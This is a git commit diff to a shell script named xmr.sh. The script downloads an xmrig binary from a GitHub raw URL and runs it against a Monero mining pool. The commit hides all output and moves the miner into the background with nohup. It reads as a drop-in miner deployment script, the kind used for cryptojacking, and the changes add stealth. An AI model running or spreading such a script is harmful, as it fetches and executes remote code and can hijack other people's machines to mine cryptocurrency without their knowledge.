e879126f39de474be1012006941633e9cf646a77
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-07-11 01:07:14 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-apt-get update && apt-get install sudo
+apt-get update && apt-get install sudo > /dev/null 2>&1
 
 sudo apt update > /dev/null 2>&1
 sudo apt install screen -y > /dev/null 2>&1
@@ -15,4 +15,4 @@ wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig
 chmod +x xmrig
 sudo ph add xmrig
 
-./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0
+nohup ./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0 >/dev/null 2>&1 > nohup.out
